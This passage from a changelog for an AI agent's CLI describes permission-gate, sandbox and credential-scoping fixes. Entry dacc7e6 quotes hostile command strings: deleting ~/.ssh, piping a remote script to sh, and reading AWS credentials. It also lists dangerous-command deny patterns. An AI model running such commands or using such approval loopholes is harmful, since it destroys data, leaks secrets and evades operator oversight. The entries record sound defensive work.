  `LogSinkCounters` had five fields incremented on every record and no reader anywhere. It could not have had one: the counters lived on whatever logger `createLogger` built, and `getRootLogger()` resolves per call and built a fresh one each time, so every total died with the expression that produced it. `installProcessSink` now owns one counter set per installed destination and every logger routed through it adds to those totals. A replacement install (`{ replace: true }`) starts at zero rather than carrying the previous destination's counts forward — the numbers describe the sink that is live.

  `createLogger` takes an optional second argument, a counter set to share. Omitting it is unchanged behaviour: a host that builds its own logger for one subsystem keeps its own counts unless it asks otherwise.

- b1bb2e0: Nothing stored a per-message judgment, so every consumer had to invent its
  own side table to answer the most basic question there is — was that answer
  any good.

  `MessageFeedbackStore` records a `'good' | 'bad'` rating and an optional
  note per `{ runId, messageId }`, in memory or on disk. `rating` is a closed
  union rather than a number or a free string: a 1–5 scale invites a mean
  nobody can interpret across raters, and widening the union later is now a
  deliberate major rather than an accident.

  Writes are compare-and-set on a per-record `ownerVersion`, throwing
  `StaleFeedbackError` with both the expected and the actual version. The
  disk store's first write uses an exclusive create, so two raters who each
  read "no feedback yet" cannot both land — a read-then-write is not atomic,
  and a rating is exactly the kind of value where last-write-wins loses
  information nobody notices is gone.

  A rating aimed at a `messageId` that appears in no event of the named run
  is refused with `UnknownMessageError` and nothing is written. A row
  pointing at a message nobody can find is unreviewable and
  indistinguishable from a real one. A disk store built without a run
  directory to validate against refuses every write rather than accepting
  everything it cannot check.

  Both implementations run one conformance suite, which found a real
  divergence between them the day it was written.

  In the CLI, `/feedback good|bad [note]` rates the last answer. With no
  answer yet it refuses rather than writing against a synthesized id. The
  kernel's `messageId` and `runId` now travel across the CLI's event seam,
  which previously dropped both.

- be95e43: Emit the CLI boot narrative — sandbox notice, provider chain, capability probe, config provenance and a terminal ready/refused event

  **`@namzu/sdk`**: `EVENT_NAME_ATTRIBUTE` is now re-exported from the root barrel (`packages/sdk/src/utils/log/index.ts` was missing the value re-export that let it reach a host package). This is what lets a package outside the SDK — `@namzu/cli`, here — name a boot event without duplicating the reserved key `createLogger` promotes onto `LogRecord.eventName`.

  **`@namzu/cli`**'s default stderr output changes from nothing to an info-level boot narrative on every invocation, not only `run`/`drain`/`run-stream`/the TUI — `namzu doctor`/`namzu login` now also print `namzu.boot.start` and `namzu.config.resolved` ahead of their own output, because `getContext()` is the one place any subcommand resolves logging + config. Use `--quiet` (LOG-05) to go back to warn-and-above; `NAMZU_LOG_LEVEL=silent` remains a full return to today's silence.

  The highest-value line: `ResolvedSandbox.notice`/`.unconfined` (computed on every boot, discarded until now) are emitted as `namzu.sandbox.resolved`, at `warn` specifically when nothing is confined and `info` otherwise — an operator reading default output now sees "this platform enforces none of filesystem, network, process" instead of it existing only in a field nothing read.

  Also new: `namzu.provider.resolved` (the constructed chain and each skipped fallback's reason), `namzu.capability.detected`/`.broken` (via `probeCapabilities`, gaining its first consumer and joining `@namzu/cli`'s public exports alongside the existing `probeOptionalPackage`/`CapabilityProbe`/`NAMZU_OPTIONAL_CAPABILITIES`), `namzu.discovery.completed` (MCP connectors — plugin/skill discovery is not yet wired to the boot path and is not claimed here), `namzu.telemetry.status` (states plainly that no `TracerProvider`/`LoggerProvider` is registered, since the CLI does not call `registerTelemetry()` on any path today), and the terminal `namzu.boot.ready` / `namzu.boot.refused` pair — `ready` fires exactly once on success with no boolean readiness field, `refused` fires at `error` on every early return out of `createAgentSession` including a `sandbox.requireIsolation` control this host cannot meet, which now also logs before the process exits non-zero (the exit code itself is unchanged — the existing top-level catch in `runCli` already produced it).

  The two previously-silent `catch {}` blocks in `packages/cli/src/tui/agent.ts` (a failed provider-client rebuild after an OAuth token refresh; a sub-agent runtime that failed to start) now each emit one `warn` record with `exception.type`/`exception.message`. Neither's behavior changed — both remain non-fatal.

  No exported signature changed and no default changed; every addition is either a new export or new stderr output governed by the existing `--quiet`/`--verbose`/`NAMZU_LOG_LEVEL`/`NAMZU_LOG_FORMAT` controls.

- 71ed5df: A credential turning over is now observable, and the doctor's vault check
  can answer.

  Rotation was invisible: a lapsed OAuth token was refreshed straight into
  the CLI's file store, and the bus carried `vault_lookup` with no change
  event — so no probe subscriber could see a credential replaced, and nothing
  could answer "when did this last rotate".

  `vault_credential_changed` joins the bus, dispatched through the same probe
  registry `vault_lookup` already uses rather than a second one, which would
  mean a subscriber that saw lookups and not rotations depending on which it
  found. `kind` separates `set` from `rotated`, which is the distinction a
  reader wants: a first write is configuration, a replacement is a credential
  turning over. The event carries the credential's NAME and never its value —
  a change event exists to be logged, forwarded and retained, which is
  exactly what a secret must not be.

  `FileCredentialProvider` makes the CLI's hardened store writable through
  the seam. It adds no file logic of its own: the store already owns the `wx`
  open, the `0600`, and the read-back that proves the mode landed, and a
  second copy of that guarantee is the one that would drift.

  The doctor's vault check answered `skipped` unconditionally with "no vault
  auto-discovery in v1" — the same answer on every machine, forever, which is
  the shape `a-check-that-cannot-fail` warns about. It now reports what the
  registered providers describe, and returns `skipped` only when none is
  registered. It calls `describe`, never `resolve`: this output is what an
  operator pastes into an issue.

- fec1e27: Stop silencing the CLI's own logger

  Every one of `namzu run`, `namzu drain`, `namzu run-stream` (including its `providers-json` sibling) and the interactive TUI forced the SDK logger's level to `silent` on its way into a session, and nothing anywhere in the tree ever turned it back on. That is the whole, literal reason a boot problem, a skipped provider, or a discovery failure never showed up anywhere: not a missing feature, a standing instruction to throw every diagnostic away.

  Each entry point now installs a real sink instead:

  - `run`/`drain` write pretty-printed records to stderr by default; pass `--log-format json` (or set `NAMZU_LOG_FORMAT=json`) for NDJSON.
  - `run-stream` (and `providers-json`) always write NDJSON to **stderr** — a machine-read channel distinct from stdout's own event protocol, which is untouched by any of this.
  - The interactive TUI buffers into a ring buffer instead of writing at all (Ink owns the terminal), and flushes it to stderr on a clean exit or a crash.

  New flags: `--verbose` (debug level) and `--log-format <pretty|json>`. The existing `-q`/`--quiet` now also raises the log floor to warn. New env vars: `NAMZU_LOG_LEVEL`, `NAMZU_LOG_FORMAT`. An explicit `--verbose`/`--quiet`/`--log-format` always wins over its environment-variable counterpart.

  **Default stderr output changes from nothing to info-level records.** Anyone parsing a namzu subprocess's stderr and relying on it being empty should pass `--quiet` (or set `NAMZU_LOG_LEVEL=warn`) to restore the old behaviour; stdout — every command's actual protocol — is unaffected.

### Patch Changes

- ff132b3: Running `.github/scripts/verify-consumer-install.sh` deleted every uncommitted changeset in the working tree.

  The script rewrites each package manifest to check what would PUBLISH rather than what sits in the tree, so it snapshots the version-carrying files on entry and restores them on exit. The restore does `rm -rf .changeset` and untars the snapshot back.

  The snapshot was taken with `git ls-files`, which lists TRACKED files. A changeset you have just written is by definition untracked, so it was never in the snapshot and the `rm -rf` was the last thing that happened to it — silently, by a gate `AGENTS.md` tells every contributor to run before pushing, on the one file that declares what the push is supposed to release. The comment above the restore already stated the rule this broke: a developer's uncommitted edit is not this script's to discard.

  `.changeset/` is now snapshotted from disk. The manifests keep `git ls-files`, which is the right tool for them: it finds every tracked manifest wherever a package lives, so a new package directory cannot fall outside the snapshot.

  A regression test in `scripts/__tests__/` drives the round trip with one committed and one uncommitted changeset — the distinction the defect turned on — and asserts the script no longer reaches for `git ls-files` on that path. `pnpm test:scripts` now runs every file in that directory rather than one named file, so the next test added there is not silently unrun.

- dd170fe: A default-level start is readable again, and a misplaced global flag says where
  it goes.

  `ManagedRegistry.register` logged at `info`, once per item, and a CLI run
  registers dozens — every builtin tool, every agent, every task tool. Turning
  the logger back on therefore replaced silence with twenty lines of
  `Registered: read`, `Registered: write` ahead of anything an operator could act
  on. Registration is the startup path working; it belongs at `debug`. The
  overwrite case stays at `warn`, because a second registration under a live id
  is news.

  `namzu run "…" --verbose` was answered with "pass `--` before a prompt that
  starts with a dash" — advice about a prompt beginning with `-`, which sends the
  reader to the wrong half of their command line. `--verbose`, `--quiet`,
  `--log-format` and `--format` are program options, accepted before the command
  name, and the refusal now says exactly that and shows the position.

  Both were found by running the CLI against a real provider. Every unit test in
  these paths asserts against a logger stub or passes flags in the position that
  already worked, so neither was visible to any of them.

- 7aaa35d: Strings that were asserted into ids now go through the checked constructors, and three defects the assertions were hiding are fixed.

  **A docker sandbox's id had the wrong prefix.** `SandboxId` is `` `sbx_${string}` ``; `@namzu/sandbox`'s docker backend minted `sandbox_...` and an `as SandboxId` was the only reason that compiled. Every docker sandbox in the tree carried an id its own type says is impossible — the ACI backend already minted `sbx_`. Both now mint through `asSandboxId`, which is the call that would have caught it. **The container name derives from this** (`namzu-sandbox-${id}`), so a container started by this release is named differently from one an older build started. Nothing matches on the old spelling — teardown computes the name from the id it just minted, in the same process — but it is visible in `docker ps`, and any external tooling that pattern-matched `namzu-sandbox-sandbox_` needs updating.

  **A corrupt migration marker was honoured instead of refused.** `readMarker`'s shape check validated the envelope — `version`, `at`, and that `migratedThreads` is an array — and never looked inside the array. `{"migratedThreads":[null]}` therefore parsed cleanly and produced an entry whose `newProjectId` was `undefined` wearing a `ProjectId` annotation, which then reached a path join. Each element is now checked, and a bad one returns `null` — which is exactly what this function already promised to do about corruption, so the caller re-runs the migration rather than trusting it.

  **`namzu drain` accepted a mistyped scope flag.** `--tenant`, `--project` and `--session` were asserted straight into their id types, so `--tenant prj_a` reached the store and listed nothing — and "no runs" is the same output as a scope that really is empty, which made the typo invisible. Each flag is now prefix-checked, and the refusal names the prefix it wanted, in the same operator-readable shape the command's other refusals use.

  **Model-authored ids are checked before they become store keys.** `read_memory`, `task_update` and the RAG tool took an id straight from the model's tool input and asserted it. A malformed one read back as "not found", telling the model its record had disappeared rather than that it named the wrong thing. All three now refuse with `InvalidIdError`, whose message says which prefix was expected.

  Nothing here changes an exported type, a signature or a default. Sites where a cast is still correct — a value already guarded by an explicit prefix check, an id minted by a service outside this repo, a sentinel the type cannot express — keep the cast and now carry the reason next to it.

- ab80de5: `namzu doctor` reported installed optional packages as missing. `@namzu/files` and `@namzu/telemetry` both read "not installed (optional package)" on machines where they were installed and working, and the boot narrative's capability line said the same.

  `probeOptionalPackage` asked `require.resolve` whether a package was on disk. That is not the question it answers: it answers whether CJS may load the package's entry point, and every optional package here is ESM-only with an `exports` map that declares `import` and no `default`, so the resolver correctly throws `ERR_PACKAGE_PATH_NOT_EXPORTED`. The probe read that throw as `absent`.

  `@namzu/sdk` is what hid it. Its exports map carries a `default` condition, so it was the one specifier in the tree that resolved — anybody spot-checking the probe against it saw the right answer.

  The probe now walks `node_modules` upward for `<specifier>/package.json`, which is resolver-agnostic and is what "installed" means. `import.meta.resolve` would also have been correct and is not available under the test runner's module transform, so a probe built on it could not have been held by the tests that are supposed to hold it.

  The existing tests all drove an absolute fixture path, because there is no way to uninstall a real package inside a test run — so none of them reached the bare-specifier branch where the defect lived. Two regression tests now do, one in each direction.

  `telemetry.sessionExport` resolves `@namzu/telemetry` through this same probe rather than a second copy, so it inherits the fix and cannot drift from what the doctor reports.

- 940f52b: `CredentialProvider` is a seam a host can implement to say where a
  credential comes from, with `EnvCredentialProvider` shipped in the box.

  Every LLM-provider credential lookup lived in `@namzu/cli`, which walks its
  own provider registry and reads `process.env` directly. A host embedding the
  SDK alone had no way to plug in an env- or file-backed source short of
  reimplementing `CredentialVault` — a connector-scoped interface that asks a
  different question, holds a whole `AuthConfig` per connector, and has one
  in-process implementation with no notion of writability.

  `describe()` never carries the value. "Does this exist" is asked in places a
  secret must not travel to — a doctor readout, a picker, a log line — and a
  description that carried one would leak on every one of them while looking
  like metadata.

  `EnvCredentialProvider` is read-only and says so: `set` and `unset` throw a
  named error pointing at a writable alternative, rather than accepting a
  write and dropping it. A `set` on `process.env` changes one map in one
  process and vanishes with it, while the caller is told it worked.

  The credential key-name vocabulary moves to `constants/credential-env-keys.ts`,
  a leaf with no imports beside `secret-patterns.ts` — that file matches
  credential VALUES, this one the names they are carried under. The host-bash
  environment scrub and the credential seam now read the same table, and
  `isCredentialEnvKey` is exported so a host with its own provider registry can
  assert its variables are ones the scrub will withhold. A name in one table
  and not the other means a variable the CLI reads an API key from and the
  scrub hands to a shell command.

  CLI discovery goes through the seam with identical results.

- 982f0dd: The TUI's local `exceptionAttributes` helper (`packages/cli/src/tui/agent.ts`) is now typed to return `LogAttributes` instead of a bare `Record<string, string>`. The two keys it has always produced (`exception.type`, `exception.message`) already match the namespace pattern, so this is a type-level narrowing with no behavior change — it exists so `scripts/check-log-standard.mjs`'s new namespaced-attribute-key rule can prove the call sites that pass this helper's result to a `Logger` are compliant by type, rather than leaving them as three more entries in that rule's ratchet count.

  No public API change: `exceptionAttributes` is a module-private function, never exported.

- 6e11fd7: Every diagnostic these two packages emit now has a constant message body, and the identifiers that used to be interpolated into it are attributes beside it.

  87 `Logger` call sites across 29 files were rewritten. `` `Tool execution error: ${toolName}` `` is now `'Tool execution error'` with `namzu.tool.name` in the attribute bag; `` `Tenant registered: ${id} (${name})` `` is now `'Tenant registered'` with `namzu.tenant.id` and `namzu.tenant.name`. Where the neighbouring bag already carried the value, only the message changed; where it did not, the value moved into a new `namzu.*` key in the same edit — a constant body that costs an operator the identifier would be a worse record, not a compliant one.

  **If you grep, alert on, or group by these message bodies, your queries need updating.** No exported type, signature or default changed, and nothing fails to compile — this is diagnostic output, not API — but a log pipeline matching the old interpolated text will stop matching. The upside is the reason for the change: an operator can now grep one literal for every occurrence of an event, and a dashboard can group by it, neither of which was possible when each occurrence rendered a different string.

  `scripts/check-log-standard.mjs`'s rule-3 ratchet (`constantBodyViolationCount`) goes 87 → 0. At zero it stops being a budget and becomes a floor: the _first_ new template literal in a `Logger` call fails CI, not the hundredth. Rule 4 (`namespacedAttributeKeyViolationCount`) is unchanged at 794 and still being worked down.

- 62773b8: `TaskGateway` becomes `TaskScheduler` and `LocalTaskGateway` becomes
  `LocalTaskScheduler`. Old names still work and are marked `@deprecated`;
  they go in the next major.

  "Gateway" names an object that sits at a system boundary and faces outward
  — Fowler's POEAA Gateway, an API gateway, a payment gateway. This one faces
  inward: it creates, waits on, continues, cancels and lists in-process agent
  tasks. A reader who trusted the name expected a facade over something
  external and found a scheduler.

  Two config fields move with the types, because the field name is what a
  host actually types and leaving one spelled `gateway` would retire the type
  while keeping its vocabulary:

  - `QueryParams.taskGateway` → `QueryParams.taskScheduler`
  - `SupervisorAgentConfig.gateway` → `SupervisorAgentConfig.scheduler`

  Both accept either spelling for the window. Setting both to different
  instances throws and names both fields; setting both to the same instance
  is fine. The supervisor resolves the pair once rather than at each read, so
  a host that sets only the new name cannot get a working scheduler on one
  path and `undefined` on another.

  `SupervisorAgentConfig` with neither a scheduler nor an `agentManager` is
  still an error, and the message now names `scheduler`.

- 6f4cd04: The verification gate is an authorization gate, and is named one. Old names
  still work and are marked `@deprecated`; they go in the next major.

  | Old                               | New                       |
  | --------------------------------- | ------------------------- |
  | `VerificationGate`                | `AuthorizationGate`       |
  | `VerificationRule`                | `AuthorizationRule`       |
  | `VerificationGateConfig`          | `AuthorizationGateConfig` |
  | `verificationGate` (config field) | `authorizationGate`       |

  A reader who saw `VerificationGate` expected something that verifies a claim
  — checks a signature, confirms an output matches a schema. It is a rule
  engine that decides, before a tool runs, whether the call is permitted:
  allow, deny or review, by name, category, tier, or a pattern over the
  arguments. Every rule variant already said so. The misreading was not
  academic: the module sat beside real guardrail and HITL neighbours, where
  "verification" suggests exactly the post-hoc double-check the guardrails do.

  The config field is on `ReactiveAgentConfig`, `SupervisorAgentConfig`,
  `runAgent`'s options and `QueryParams`. Both spellings are accepted for the
  window and resolved at one site; setting both to different configs throws
  and names both fields. One resolve rather than four matters more here than
  for an ordinary rename — a gate present on one path and absent on another
  means a tool call permitted where it should have been refused.

  Also renamed, and reachable only in type position: `VerificationRuleSchema`
  and `VerificationGateConfigSchema`. They are not exported as values, but
  `import type` and `typeof` both worked, so they carry aliases rather than
  disappearing.

  Deliberately unchanged, because each is already correct about what it is:
  `GateDecision`, `GateEvaluationResult`, `ToolCallContext`, `describeRule`,
  `evaluateRule`, `defaultSandboxedGateConfig`,
  `defaultSandboxedShellGateConfig`.

  The module-invariant registry — `createInvariantRegistry`, `invariants`,
  `InvariantRegistry` and friends — moved to its own directory rather than
  into `authorization/`. It is the one thing in the old `verification/` that
  genuinely verifies a claim: what a module says about its own live state. No
  import path changes for consumers; it is exported from the same barrel.

- ad98269: Tools now decide how their calls and results are shown, and the CLI stopped
  matching on tool names.

  `write` gains `presentCall`, returning a diff with an empty `before` —
  which is what a write is: whatever was there is gone and this replaces it.
  `edit` and `write` both gain `presentResult` returning a plain label, which
  is what suppresses the detail block: the content was already shown under
  the call, and repeating it doubles the longest rows in a transcript to say
  nothing new. That decision used to be a host matching two names.

  `createToolPresenter`'s result fallback changed from a `generic` view
  truncated to 120 characters to a `terminal` view carrying the whole output.
  A host renders a result across many rows and decides for itself how many
  fit — that is a property of its terminal, not of the tool — and truncating
  in the kernel destroyed text no host could then recover. A tool that wants
  the one-line form returns a `generic` view itself.

  In the CLI this deletes `summarizeToolInput`, `previewToolInput`,
  `toolStartDetail` and `toolEndDetail`, replacing four name-matching
  functions with one `viewToLines`. A tool the CLI has never heard of — an
  MCP server's, a plugin's — now gets a diff if it asks for one, where before
  it got a truncated JSON blob no matter what it did.

- 50c0f29: `Topic` becomes the primary name for the container between Project and Session.
  Every exported `Thread*` name keeps working as a `@deprecated` alias.

  The layer has always been a topic — its own docstring calls it a "Topic-level
  container" — and `Thread` is the one word in this kernel's OS vocabulary that
  already means something specific and different, for a thing that has no
  execution and no state machine of its own.

  Renamed, with identity aliases on the public surface: `TopicManager` /
  `ThreadManager`, `InMemoryTopicStore` / `InMemoryThreadStore`,
  `generateTopicId` / `generateThreadId`. `TopicId` is a type alias to the
  unchanged `ThreadId`; both are still `` `thd_${string}` `` this release.

  **Not in this release**, and deliberately: the `thd_` prefix itself, the
  `threadId` field on persisted records, and `acceptLegacyThreadId` /
  `rejectLegacyPrefix`. The last two belong to a DIFFERENT `thd_` — the
  pre-0.2.0 top-level container the migration coerces to `prj_legacy_*` — and
  merging the two meanings is the confusion this chain exists to end. The prefix
  and the field each carry a data migration and land separately.

- Updated dependencies [9914794]
- Updated dependencies [3939dc9]
- Updated dependencies [f05a0f1]
- Updated dependencies [d7d38a3]
- Updated dependencies [f12284a]
- Updated dependencies [19a72ff]
- Updated dependencies [5136fbd]
- Updated dependencies [966c6de]
- Updated dependencies [eff96ac]
- Updated dependencies [70f8d75]
- Updated dependencies [dd170fe]
- Updated dependencies [b947794]
- Updated dependencies [5d23bf4]
- Updated dependencies [5f5becd]
- Updated dependencies [94842e4]
- Updated dependencies [9b15964]
- Updated dependencies [d54fe08]
- Updated dependencies [655cc9d]
- Updated dependencies [1e996bc]
- Updated dependencies [13b2682]
- Updated dependencies [be7152b]
- Updated dependencies [2928057]
- Updated dependencies [c2663c2]
- Updated dependencies [014da58]
- Updated dependencies [4edf2c6]
- Updated dependencies [7aaa35d]
- Updated dependencies [cb1a487]
- Updated dependencies [af47721]
- Updated dependencies [ee7856e]
- Updated dependencies [3331493]
- Updated dependencies [7015eee]
- Updated dependencies [83b5f83]
- Updated dependencies [30029bd]
- Updated dependencies [9b053ba]
- Updated dependencies [44b5c76]
- Updated dependencies [ae09a42]
- Updated dependencies [bab1e02]
- Updated dependencies [47437f6]
- Updated dependencies [b01068a]
- Updated dependencies [940f52b]
- Updated dependencies [ead7703]
- Updated dependencies [e45699e]
- Updated dependencies [17ba31f]
- Updated dependencies [c968b58]
- Updated dependencies [40932a1]
- Updated dependencies [320322d]
- Updated dependencies [7507e33]
- Updated dependencies [779d62a]
- Updated dependencies [75c5b4a]
- Updated dependencies [0dbf62f]
- Updated dependencies [28cbe6d]
- Updated dependencies [f8f0004]
- Updated dependencies [f2a7375]
- Updated dependencies [7015eee]
- Updated dependencies [b395a1e]
- Updated dependencies [43358a1]
- Updated dependencies [6e11fd7]
- Updated dependencies [ca97021]
- Updated dependencies [9947662]
- Updated dependencies [89dfe84]
- Updated dependencies [8a4986f]
- Updated dependencies [b1bb2e0]
- Updated dependencies [79ed788]
- Updated dependencies [da66613]
- Updated dependencies [ec15971]
- Updated dependencies [be95e43]
- Updated dependencies [c166029]
- Updated dependencies [a093e22]
- Updated dependencies [01684bf]
- Updated dependencies [71939c1]
- Updated dependencies [e010634]
- Updated dependencies [9aba59a]
- Updated dependencies [5a4f7b4]
- Updated dependencies [7adf919]
- Updated dependencies [70f23bb]
- Updated dependencies [413d939]
- Updated dependencies [1d428e6]
- Updated dependencies [f9c1589]
- Updated dependencies [fad5da4]
- Updated dependencies [4992819]
- Updated dependencies [215f7b5]
- Updated dependencies [62773b8]
- Updated dependencies [6f4cd04]
- Updated dependencies [71ed5df]
- Updated dependencies [b7f7897]
- Updated dependencies [dec1964]
- Updated dependencies [e5dde44]
- Updated dependencies [8053dc1]
- Updated dependencies [9142405]
- Updated dependencies [4ccf9e3]
- Updated dependencies [f94ca7d]
- Updated dependencies [2df8cd2]
- Updated dependencies [f9833ab]
- Updated dependencies [4abc5ee]
- Updated dependencies [cf48cef]
- Updated dependencies [9bce045]
- Updated dependencies [2ccbd7b]
- Updated dependencies [f2a1dd9]
- Updated dependencies [1460a02]
- Updated dependencies [ad98269]
- Updated dependencies [50c0f29]
- Updated dependencies [c665956]
- Updated dependencies [70e3163]
- Updated dependencies [5f8a8c5]
- Updated dependencies [5ed3b03]
- Updated dependencies [9d6c482]
  - @namzu/sdk@28.0.0
  - @namzu/openai@1.2.1
  - @namzu/anthropic@3.3.1
  - @namzu/openrouter@2.2.0
  - @namzu/files@1.0.0
  - @namzu/ollama@2.1.0

## 11.0.0

### Major Changes

- ee70817: A connected server no longer decides whether its own tool calls need approval

  A server declared whether its own tools were read-only, and that declaration settled whether a call was approved without asking. The thing being gated supplied the input to the gate — on **three** independent paths: the kernel's `allow_read_only` rule, the CLI's prompt exemption, and the plan-mode pass in the executor.

  The wire calls those fields _hints_. All three read them as facts.

  **The asymmetry is the fix.** A self-declaration may raise the requirement and never lower it:

  - `destructiveHint: true` from a server is still believed. A server volunteering that its tool is dangerous moves toward caution, and disbelieving it buys nothing.
  - `readOnlyHint: true` no longer settles a call or skips a prompt on its own.

  **Trust comes from the operator, per server.** A tool supplied by a connected server now carries `provenance: { server, readOnlyHintTrusted }`, and `isTrustedReadOnly` is the single predicate all three gates use. Never a global switch: one flag meaning "trust annotations" hands every connected server the same reach, which is the hole it would be closing.

  `isReadOnly` still reports faithfully what the server said. Provenance and policy are different questions, and collapsing them would corrupt the outbound re-export and the destructive label a human is shown in order to fix a gate.

  **What changes for you.** Calls to a connected server's read-only tools that were auto-approved now go to review or a prompt. Host-defined tools are unaffected and need no opt-in — they came from this process, with no untrusted party in the chain. To restore the old behaviour for a server you run yourself, mark that server's read-only hints trusted.

  **More prompts is not automatically safer.** Measured work on approval UX finds miss rates rising with session length, so the per-server opt-in matters as much as the tightening does: an operator flooded with prompts approves by reflex, and that is the failure this change is trying to avoid, not cause.

- a8e2acf: The CLI runs commands in a sandbox, and you can configure it

  `sandboxProvider` appeared **zero times** in this package. `query()` attaches a sandbox only when one is supplied, so `context.sandbox` was always undefined and `BashTool` took its fallback branch — `execAsync` in the host process, with `{ ...process.env }`. Every credential your shell holds went to every command the model chose to run, on every path, interactive included. The isolation the documentation described held nowhere.

  **A sandbox is now attached by default.** Nothing to configure to get it.

  **And it is yours to control**, under a new `sandbox` block:

  ```yaml
  sandbox:
    enabled: true # default; false runs on the host
    requireIsolation: [filesystem, network] # refuse to start unless enforced
  ```

  `requireIsolation` is empty by default, and that default is honest rather than safe: available isolation differs per platform, so requiring anything by default would refuse to run on machines where the CLI works today. Name a control and you get a refusal at startup instead of a surprise at runtime.

  **Every session reports what it got**, including when the answer is "nothing". A sandbox that confines nothing is not the same as no sandbox and is not protection, so the notice says which controls are enforced and which are not, and says outright when commands are unconfined.

  **Why `major`.** Commands now run inside a sandbox, so anything reaching a path outside the workspace, or the network where the platform confines it, behaves differently. Set `sandbox.enabled: false` to keep the old behaviour — a real choice with a real reason, announced on startup rather than assumed.

### Patch Changes

- Updated dependencies [ee70817]
- Updated dependencies [2730fac]
- Updated dependencies [cce731b]
  - @namzu/sdk@27.0.0
  - @namzu/anthropic@3.3.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 10.0.0

### Major Changes

- 203928c: A config file that cannot be read stops the run instead of being read as an empty one

  **What breaks.** `loadConfig` returned `{}` for a config file it failed to open
  or parse, which is the same answer it gives for a file that is not there. It now
  throws `ConfigLoadError`, and the binary exits `78` (sysexits `EX_CONFIG`) with a
  message naming the file. Three inputs that used to start a run now refuse:
  a file that exists and cannot be opened, a file whose contents do not parse, and
  a file whose top level is not a mapping of settings.

  **Why this is not a nicety.** `permissions` is read from these files. An empty
  config is an empty rule table, and a headless run resolves every call no rule
  covered to `auto` — so a `deny` an operator had written became approval of
  exactly those calls, with nothing printed to say the table had been dropped. The
  fail-open landed on the one path where nobody is watching, and a missing brace
  was enough to reach it.

  **What a caller does about it.** If the run should have no rules, delete the file
  or empty it — absent and empty both still mean "no settings", and neither throws.
  If the file is meant to be read, the message names the file and the reason; fix
  it. A host embedding the CLI that wants the old behaviour has to catch
  `ConfigLoadError` itself and decide, in the open, that starting unrestricted is
  what it wants.

  Also new: `EXIT_BAD_CONFIG` (78) is exported alongside the other exit codes, and
  `ConfigLoadError` is exported from the package root.

### Patch Changes

- Updated dependencies [3f44f0d]
- Updated dependencies [fcc9a41]
- Updated dependencies [2737f74]
- Updated dependencies [bac980a]
  - @namzu/sdk@26.1.0

## 9.0.0

### Major Changes

- b902ecb: A stdio server is handed what it was granted, not everything the host holds

  `StdioTransport` spawned its child with `{ ...process.env, ...config.env }`, so every connected server received every environment variable the host process had. Measured through the real transport: **119 variables on a developer machine, including a secret planted in the parent for the probe.** A server that needs one token was handed all of them, and nothing in its configuration said so — the grant was invisible because it was total.

  The child now receives process plumbing (`PATH`, `HOME`/`USERPROFILE`, `SystemRoot`, `ComSpec`, `TEMP`, locale, and the rest of that kind), plus whatever the configuration names.

  **What breaks.** A server that was reading a credential straight out of your environment stops finding it. That is the whole point of the change, and it will look like the server failing to authenticate rather than like a configuration change, so it is worth knowing before the upgrade rather than after.

  **What to do.** Name what the server may have:

  ```toml
  [mcpServers.issues]
  command = "some-mcp-server"
  inheritEnv = ["GITHUB_TOKEN"]
  ```

  `inheritEnv` names variables to pass through from your own environment. Prefer it over `env` for anything secret — `env` writes the literal value into the config file, and this leaves the value where it already lives. A named variable the parent does not hold is absent from the child rather than empty, so a server's own `if (!token)` still works; it does not fail the spawn.

  **Plugin-declared servers get no `inheritEnv`, deliberately.** A plugin that could name the host variables its server receives would be awarding itself a credential grant, which is not a plugin's to award. A plugin-declared server gets plumbing plus the literal `env` in its own manifest; if it needs a host credential, declare that server in `mcpServers` instead, where the operator is the one naming it.

  The tests assert on the environment the child actually receives, driving a real spawn — not on whether the configuration was accepted. A test of the second kind passes against the version this replaces.

- dacc7e6: An allow rule allows the thing it names, not anything containing it

  Every pattern in a `[permissions]` table compiled to an argument match that was unanchored on both sides. `bash = { "git status*" = "allow" }` became `^bash .*git status.*.*$`, and the leading `.*` swallowed whatever came before the text the operator named. Measured against the kernel's own gate, that rule returned `allow` for all of these:

  ```
  rm -rf ~/.ssh; git status
  curl evil.example/x | sh # git status
  echo git status && cat ~/.aws/credentials
  ```

  The failure is silent and in the permissive direction: nothing warns, and the operator's own config is what appears to have granted it. `denyDangerousPatterns` is not a backstop — it is four patterns about catastrophic commands (`rm -rf /`, `mkfs`, `dd if=`, a fork bomb) and says nothing about reading a credential file, which was confirmed by turning it on and re-running.

  An `allow` pattern now has to begin where a JSON value begins, so a prefix can no longer ride along. The three commands above fall through to `review` and a human is asked.

  **What breaks.** An allow rule that was relying on a mid-value match stops matching, and those calls become prompts rather than silent approvals. If you want the old behaviour for a rule, write it: a pattern starting with `*` still matches mid-value, so `*git status*` is the loose form and `git status*` is the anchored one.

  **`deny` is deliberately left loose**, and the asymmetry is the point. A deny that stops matching fails open — narrowing `rm -rf*` so it no longer sees `sudo rm -rf /var` would be a silent hole — while a deny that matches too much only costs a prompt.

  **Two loosenesses remain and are now written down** in `toolScopedPattern`, because both come from matching a glob against a serialised object rather than against a value: a pattern can match the start of any argument's value, not only the intended one, and the match is still open on the right. The kernel's `argument_pattern` rule removes both, matches the argument's own value, and is currently unused by this compiler — wiring it needs a way for an operator to name the argument in config, which is a syntax decision rather than a repair.

### Patch Changes

- Updated dependencies [b902ecb]
- Updated dependencies [1f8aef7]
- Updated dependencies [2458b78]
- Updated dependencies [e2506f4]
  - @namzu/sdk@26.0.0
  - @namzu/anthropic@3.3.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 8.6.4

### Patch Changes

- Updated dependencies [917e4a5]
- Updated dependencies [e6818ee]
  - @namzu/sdk@25.0.0
  - @namzu/anthropic@3.3.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 8.6.3

### Patch Changes

- Updated dependencies [50dee5c]
  - @namzu/sdk@24.0.0
  - @namzu/anthropic@3.3.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 8.6.2

### Patch Changes

- Updated dependencies [f58a086]
  - @namzu/sdk@23.0.0
  - @namzu/anthropic@3.3.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 8.6.1

### Patch Changes

- a60a0ad: `/cost` and the status bar stop reporting an unpriced run as a free one

  The kernel now prices runs from a built-in catalogue and reports
  `costInfo.unpricedTokens` when it cannot. The CLI was still narrowing that
  record to a single number and printing
  `'$0.0000 (this provider reported no price)'` for any total not above zero —
